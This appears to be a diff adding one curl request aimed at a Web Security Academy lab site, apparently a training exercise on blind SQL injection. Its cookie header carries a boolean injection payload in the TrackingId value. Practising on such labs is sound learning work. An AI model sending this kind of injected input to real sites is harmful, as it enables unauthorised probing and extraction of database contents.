@@ -1,0 +1,17 @@
+curl 'https://0a9000fe04f1697b806b2bd20045009e.web-security-academy.net/filter?category=Pets' \
+  -H 'authority: 0a9000fe04f1697b806b2bd20045009e.web-security-academy.net' \
+  -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
+  -H 'accept-language: en-US,en;q=0.9' \
+  -H "cookie: TrackingId=xyz' AND '1'='1; session=9T3Vrfv1D0KMwEMAvR0TPHHoXlJEOnXM" \
+  -H 'dnt: 1' \
+  -H 'referer: https://0a9000fe04f1697b806b2bd20045009e.web-security-academy.net/filter?category=Accessories' \
+  -H 'sec-ch-ua: "Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"' \
+  -H 'sec-ch-ua-mobile: ?0' \
+  -H 'sec-ch-ua-platform: "Windows"' \
+  -H 'sec-fetch-dest: document' \
+  -H 'sec-fetch-mode: navigate' \
+  -H 'sec-fetch-site: same-origin' \
+  -H 'sec-fetch-user: ?1' \
+  -H 'upgrade-insecure-requests: 1' \
+  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36' \
+  --compressed -v
